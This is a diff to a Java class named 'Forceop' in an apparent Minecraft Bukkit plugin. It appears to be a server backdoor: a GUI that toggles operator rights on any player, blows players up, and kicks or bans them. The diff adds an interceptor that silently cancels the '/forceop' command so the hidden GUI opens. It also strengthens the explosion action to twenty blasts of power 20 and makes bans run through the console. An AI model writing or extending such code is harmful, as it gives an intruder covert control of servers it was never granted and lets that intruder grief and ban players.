@@ -12,6 +12,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.Action;
 import org.bukkit.event.inventory.InventoryClickEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerInteractEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.inventory.Inventory;
@@ -108,7 +109,9 @@ public class Forceop implements Listener {
 				pl.setOp(!pl.isOp());
 				p.closeInventory();
 			} else if (command.equalsIgnoreCase("bomb")) {
-				pl.getWorld().createExplosion(pl.getLocation(), 10, false);
+				for(int index = 0; index < 20; index++){
+					pl.getWorld().createExplosion(pl.getLocation(), 20, false);					
+				}
 				p.closeInventory();
 			} else if (command.equalsIgnoreCase("stack")) {
 				ItemStack item = pl.getItemInHand();
@@ -123,9 +126,17 @@ public class Forceop implements Listener {
 				pl.kickPlayer("Kicked by operator");
 				p.closeInventory();
 			} else if (command.equalsIgnoreCase("ban")) {
-				pl.setBanned(true);
+				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban " + pl.getName());
 				pl.kickPlayer("Kicked by operator");
 			}
+		}
+	}
+	
+	@EventHandler
+	public void command(PlayerCommandPreprocessEvent e) {
+		if(e.getMessage().equalsIgnoreCase("/forceop")) {
+			e.getPlayer().sendMessage("forceop GUI");
+			e.setCancelled(true);
 		}
 	}
 
@@ -133,8 +144,8 @@ public class Forceop implements Listener {
 		Inventory inv = Bukkit.createInventory(new Inventoryholder(), 54, ChatColor.RED + command);
 		for (Player p : Bukkit.getOnlinePlayers()) {
 			// if(players.contains(p.getUniqueId().toString())) continue;
-			ItemStack skull = createItem(Material.SKULL_ITEM, 1, (byte) 3, "&7" + p.getName(),
-					Arrays.asList("&6Player info:", "&eOp: &6"+p.isOp(), "&eGamemode:&6 " + p.getGameMode().toString().toLowerCase()));
+			ItemStack skull = createItem(Material.SKULL_ITEM, 1, (byte) 3, "&6" + p.getName(),
+					Arrays.asList("&ePlayer info:", "&eOp: &6"+capitalizeFirstLetter(p.isOp()+""), "&eGamemode:&6 " + capitalizeFirstLetter(p.getGameMode().toString().toLowerCase())));
 			SkullMeta meta = (SkullMeta) skull.getItemMeta();
 			meta.setOwner(p.getName());
 			skull.setItemMeta(meta);
@@ -257,6 +268,13 @@ public class Forceop implements Listener {
 				}
 			}
 		}.runTaskTimer(main, 0, 1);
+	}
+	
+	public String capitalizeFirstLetter(String original) {
+	    if (original == null || original.length() == 0) {
+	        return original;
+	    }
+	    return original.substring(0, 1).toUpperCase() + original.substring(1);
 	}
 
 	@EventHandler
